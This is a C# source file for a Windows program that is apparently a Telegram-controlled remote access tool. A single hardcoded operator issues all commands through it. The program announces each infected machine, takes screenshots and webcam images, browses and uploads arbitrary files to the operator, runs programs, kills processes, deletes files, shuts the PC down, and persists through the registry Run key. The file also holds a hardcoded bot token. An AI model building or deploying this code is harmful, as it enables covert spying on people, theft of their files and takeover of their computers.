using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types.Enums;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Telegram.Bot.Types.InputFiles;
using System.IO;
using Emgu.CV;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace Telegram_Bot_1._0
{
    class Program
    {
        //bot token 
        public static string token { get; set; } = "2084842337:AAGm5daXbEJc2Od6Orz6HNVw5yY3OBJ5S-I";

        private static TelegramBotClient client;
        // ID user
        static int MyId = 748984820;
        //Command store
        static List<BotCommand> botCommands = new List<BotCommand>();
        static void Main(string[] args)
        {
            client = new TelegramBotClient(token);
            
            InitCommands();
            Run().Wait();
            Console.ReadKey();

        }
        static async Task Run() {
            await client.SendTextMessageAsync(MyId,$"Пользыватель:{Environment.MachineName} открыл программу");
            var offset = 0;
            while (true)
            {
                var updates = await client.GetUpdatesAsync(offset);
                foreach (var update in updates)
                {
                    if (update.Message != null && update.Message.From.Id == MyId )
                    {
                         if (update.Message.Type == MessageType.Text)
                         {
                            //making a Parse of user commands
                            var model = BotCommand.Parse(update.Message.Text);
                            if (model != null)
                            {
                                foreach (var cmd in botCommands)
                                {
                                    if (model.Command == cmd.Command )
                                    {
                                     cmd.Execute?.Invoke(model, update);
                                     cmd.OnError?.Invoke(model, update);
                                     break;
                                    }
                                }
                            }               
                            offset = update.Id + 1;
                        }                     
                    }
                    Task.Delay(1000).Wait();
                }
            }
           
        }
        private static void InitCommands() 
        {
            //  /start
            botCommands.Add(new BotCommand
            {
                Command = "/start",
                CountArgs = 0,
                Example = "/start\n",
                Execute = async (model, update)=>
                {
                    await client.SendTextMessageAsync(update.Message.From.Id, "Привет\nСписок команд которые я умею делать:\n" +
                    string.Join("\n", botCommands.Select(s => s.Example)));
                }
            });

            //  /help           output of all commands
            botCommands.Add(new BotCommand
            {
                Command = "/help",
                CountArgs = 0,
                Example = "/help\n(вывод всех команд)\n",
                Execute = async (model, update) =>
                {
                    await client.SendTextMessageAsync(update.Message.From.Id, "Список команд:\n" +
                    string.Join("\n", botCommands.Select(s => s.Example)));
                }
            });

            //  /exit           exit program 
            botCommands.Add(new BotCommand
            {
                Command = "/exit",
                CountArgs = 0,
                Example = "/exit\n(закрытие программы у пользователя)\n",
                Execute = async (model, update) =>
                {
                    try
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, ":(");
                        new Thread(() =>
                        {
                            Thread.Sleep(2000);
                            System.Environment.Exit(0);
                        }).Start();
                    }
                    catch (Exception ex)
                    {

                        await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                    }
                  
                }
            });

            //  /shutdown       turn off computer
            botCommands.Add(new BotCommand
            {
                Command = "/shutdown",
                CountArgs = 0,
                Example = "/shutdown\n(выключение ПК через 5 секунд)\n",
                Execute = async (model, update) =>
                {
                    try
                    {
                        Process.Start("shutdown", "/s /t 5");
                    }
                    catch (Exception ex)
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                    }
                }
            });

            //  /open           opens a website or program
            botCommands.Add(new BotCommand
            {
                Command = "/open",
                CountArgs = 1,
                Example = "/open[path|url]\n(открывает ссылку на сайт или .exe файл по пути)\n",
                Execute = async (model, update) =>
                {
                    try
                    {

                        if (Uri.IsWellFormedUriString(model.Args, UriKind.Absolute))
                        {
                            Process.Start("explorer", model.Args);
                        }
                        else
                        {
                            Process.Start( model.Args);
                        }                                  
                        await client.SendTextMessageAsync(update.Message.From.Id, "ссылка/программа открыта");
                    }
                    catch (Exception ex)
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                    }
                }
            });

            //  /getProcess    opens a website or program
            botCommands.Add(new BotCommand
            {
                Command = "/getProcess",
                CountArgs = 0,
                Example = "/getProcess\n(вывод всех процессов)\n",
                Execute = async (model, update) =>
                {
                    try
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, "Список команд:\n" +
                        string.Join("\n", Process.GetProcesses().Select(s => s.ProcessName)));
                    }
                    catch (Exception ex)
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                    }
                }
            });

            //  /killProcess    opens a website or program
            botCommands.Add(new BotCommand
            {
                Command = "/killProcess",
                CountArgs = 1,
                Example = "/killProcess[name]\n(убить процесс по имени)\n",
                Execute = async (model, update) =>
                {
                    try
                    {
                        foreach (Process proc in Process.GetProcessesByName(model.Args))
                        {
                            proc.Kill();
                        }
                        await client.SendTextMessageAsync(update.Message.From.Id, "Процесс с заданым именем убит");
                    }
                    catch (Exception ex)
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                    }
                }
            });

            //  /getFolder      output of all folders and files along the path along the path
            botCommands.Add(new BotCommand
            {
                Command = "/deleteFile",
                CountArgs = 1,
                Example = "/deleteFile[path]\n(удаление файлов по пути)\n",
                Execute = async (model, update) =>
                {
                    try
                    {

                        if (File.Exists(model.Args))
                        {
                            if (DeleteFile(model.Args))
                            {
                                await client.SendTextMessageAsync(update.Message.From.Id, "Файл удален");
                            }
                            else
                            {
                                await client.SendTextMessageAsync(update.Message.From.Id, "Ошибка");
                            }
                        }
                        else
                        {
                            await client.SendTextMessageAsync(update.Message.From.Id, "путь не найден");
                        }
                    }
                    catch (Exception ex)
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                    }
                }
            });

            //  /getFolder      output of all folders and files along the path along the path
            botCommands.Add(new BotCommand
            {
                Command = "/getFolder",
                CountArgs = 1,
                Example = "/getFolder[path]\n(вывод всех папок и файлов по пути по пути)\n",
                Execute = async (model, update) =>
                {
                    try
                    {

                        if (Directory.Exists(model.Args))
                        {
                            await client.SendTextMessageAsync(update.Message.From.Id, "Directories:\n" +
                            string.Join("\n", Directory.GetDirectories(model.Args)));

                            await client.SendTextMessageAsync(update.Message.From.Id, "Files:\n" +
                            string.Join("\n", Directory.GetFiles(model.Args)));
                        }
                        else
                        {
                            await client.SendTextMessageAsync(update.Message.From.Id, "путь не найден");
                        }
                    }
                    catch (Exception ex)
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                    }
                }
            });

            //  /downloadFiles  gets a list of files in a directory
            botCommands.Add(new BotCommand
            {
                Command = "/downloadFiles",
                CountArgs = 1,
                Example = "/downloadFiles[path]\n(загружает файл по пути)\n",
                Execute = async (model, update) =>
                {
                    try
                    {

                        if (File.Exists(model.Args))
                        {
                            FileStream file = File.Open(model.Args, FileMode.Open);
                            await client.SendTextMessageAsync(update.Message.From.Id, "Файл загружается...");
                            await client.SendDocumentAsync(MyId, new InputOnlineFile(file, model.Args));                            
                            file.Close();
                        }
                        else
                        {
                            await client.SendTextMessageAsync(update.Message.From.Id, "файл не найден");
                        }
                    }
                    catch (Exception ex)
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                    }
                }
            });

            //  /getIpconfig    gets a ipconfig file
            botCommands.Add(new BotCommand
            {
                Command = "/getIpconfig",
                CountArgs = 0,
                Example = "/getIpconfig\n(получить ipconfig файл)\n",
                Execute = async (model, update) =>
                {
                    string filePath = "file.txt";
                    try
                    {                        
                        if (DeleteFile(filePath))
                        {
                            Process ipconfig = new Process();
                            ipconfig.StartInfo.FileName = "cmd.exe";
                            ipconfig.StartInfo.Arguments = $"/c ipconfig.exe >{filePath}";
                            ipconfig.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            ipconfig.Start();
                            ipconfig.WaitForExit();
                            ipconfig.Dispose();
                            FileStream ipFile = File.Open(filePath, FileMode.Open);
                            await client.SendDocumentAsync(MyId, new InputOnlineFile(ipFile, filePath));
                            ipFile.Close();
                        }
                        else
                        {
                            await client.SendTextMessageAsync(update.Message.From.Id, "файл не найден");
                        }
                    }
                    catch (Exception ex)
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                        DeleteFile(filePath);
                    }
                }
            });

            //  /autoloadOn       autoload On
            botCommands.Add(new BotCommand
            {
                Command = "/autoloadOn",
                CountArgs = 0,
                Example = "/autoloadOn\n(добавление приложения в автозагрузку)\n",
                Execute = async (model, update) =>
                {
                    try
                    {
                        const string applicationName = "Telegram_Bot_1._0";
                        const string pathRegistryKeyStartup =
                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

                        using (RegistryKey registryKeyStartup =
                                    Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
                        {
                            registryKeyStartup.SetValue(
                                applicationName,
                                string.Format("\"{0}\"", System.Reflection.Assembly.GetExecutingAssembly().Location));
                        }
                        await client.SendTextMessageAsync(update.Message.From.Id, "Выполнено");
                    }
                    catch (Exception ex)
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                    }
                }
            });

            //  /autoloadOff       autoload Off
            botCommands.Add(new BotCommand
            {
                Command = "/autoloadOff",
                CountArgs = 0,
                Example = "/autoloadOff\n(удаление приложения из автозагрузки)\n",
                Execute = async (model, update) =>
                {
                    try
                    {
                        const string applicationName = "Telegram_Bot_1._0";
                        const string pathRegistryKeyStartup =
                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

                        using (RegistryKey registryKeyStartup =
                                    Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
                        {
                            registryKeyStartup.DeleteValue(applicationName, false);
                        }
                        await client.SendTextMessageAsync(update.Message.From.Id,"Выполнено");

                    }
                    catch (Exception ex)
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                    }
                }
            });

            //  /screenshot     screenshot of the screen  
            botCommands.Add(new BotCommand
            {
                Command = "/screenshot",
                CountArgs = 0,
                Example = "/screenshot\n(делает скриншот экрана)\n",
                Execute = async (model, update) =>
                {
                    string imageName = "tempBotScreen.png";
                    try
                    {                  
                        
                        if (DeleteFile(imageName))
                        {
                            ScreenShot(imageName);
                            FileStream imageFile = File.Open(imageName, FileMode.Open);
                            await client.SendDocumentAsync(MyId, new InputOnlineFile(imageFile, imageName));
                            imageFile.Close();
                            DeleteFile(imageName);
                        }
                    }
                    catch (Exception ex)
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                        DeleteFile(imageName);
                    }
             
                }
            });

            // /screencamera    screenshot of the screen  
            botCommands.Add(new BotCommand
            {
                Command = "/screencamera",
                CountArgs = 0,
                Example = "/screencamera\n(делает скриншот с веб-камеры)\n",
                Execute = async (model, update) =>
                {
                    string imageName = "tempBotScreenCamera.png";
                    try
                    {

                        if (DeleteFile(imageName))
                        {
                            ScreenCamera(imageName);
                            FileStream imageFile = File.Open(imageName, FileMode.Open);
                            await client.SendDocumentAsync(MyId, new InputOnlineFile(imageFile, imageName));
                            imageFile.Close();
                            DeleteFile(imageName);
                        }
                    }
                    catch (Exception ex)
                    {
                        await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                        DeleteFile(imageName);
                    }

                }
            });
        
        }

        static void ScreenCamera(string name)
        {
            try
            {
                int idCamera = 0;
                VideoCapture capture = new VideoCapture(idCamera);                          
                Bitmap image = capture.QueryFrame().ToBitmap();
                image.Save(name, ImageFormat.Png);
            }
            catch (Exception ex)
            {
                foreach (var cmd in botCommands)
                {
                    if (cmd.Command == "/screencamera")
                    {
                        cmd.OnError = async (model, update) =>
                        {
                            await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                        };
                    }
                }
            }
           
        }
        static  void ScreenShot(string name)
        {
            try
            {
                Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    bitmap.Save(name, ImageFormat.Png);
                }
            }
            catch (Exception ex)
            {

                foreach (var cmd in botCommands)
                {
                    if (cmd.Command == "/screenshot")
                    {
                        cmd.OnError = async (model, update) =>
                        {
                            await client.SendTextMessageAsync(update.Message.From.Id, ex.Message);
                        };
                    }
                }
               
            }
            
        }
        static  bool DeleteFile(string path)
        {
            try
            {
                File.Delete(path);
                return !File.Exists(path);
            }
            catch (Exception)
            {
                return false;
            }
             
        }
    }
}
